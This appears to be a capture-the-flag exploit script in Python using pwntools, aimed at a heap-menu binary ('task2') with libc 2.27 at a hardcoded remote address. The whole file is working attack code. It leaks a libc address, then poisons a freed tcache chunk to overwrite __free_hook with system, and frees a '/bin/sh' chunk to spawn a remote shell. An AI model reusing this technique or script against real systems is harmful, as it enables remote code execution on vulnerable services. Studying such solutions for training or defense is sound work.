
from pwn import *
from time import sleep

exe = ELF("./task2")
libc = ELF("./libc-2.27.so")
context.binary = exe
#context.log_level = "debug"

global io
breakpoints = '''
break system
continue
'''

context.terminal = "tmux splitw -h".split()
ip, port = "40.71.72.198", 1235

# io = process(exe.path, env = {"LD_PRELOAD":"./libc-2.27.so"})
# gdb.attach(io,breakpoints)
io = remote(ip, port)

def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

def create(index,size,data):
    reu(">> ")
    sl("1")
    reu(">> ")
    sl(str(index))
    reu(">> ")
    sl(str(size))
    reu(">> ")
    s(data)

def edit(index,data):
    reu(">> ")
    sl("3")
    reu(">> ")
    sl(str(index))
    reu(">> ")
    s(data)

def free(index):
    reu(">> ")
    sl("2")
    reu(">> ")
    sl(str(index))

def view(index):
    reu(">> ")
    sl("4")
    reu(">> ")
    sl(str(index))

leak_offset = 0x3ec760
free_hook = libc.symbols["__free_hook"]

create(0,0x8,"A"*0x8)
create(1,0x8,"B"*0x8)
view(0)
re(8)
leak = unpack(re(5)+"\x7f",48)-leak_offset
log.info("Libc -> "+hex(leak))
log.info(hex(leak+libc.symbols["system"]))
log.info(hex(leak+free_hook))
free(1)
free(0)
edit(0,pack(leak+free_hook,48)+"\n")
create(2,0x10,"/bin/shh\x00")
create(4,0x10,p64(leak+libc.symbols["system"])[:6] + "\xff")
free(2)
io.interactive()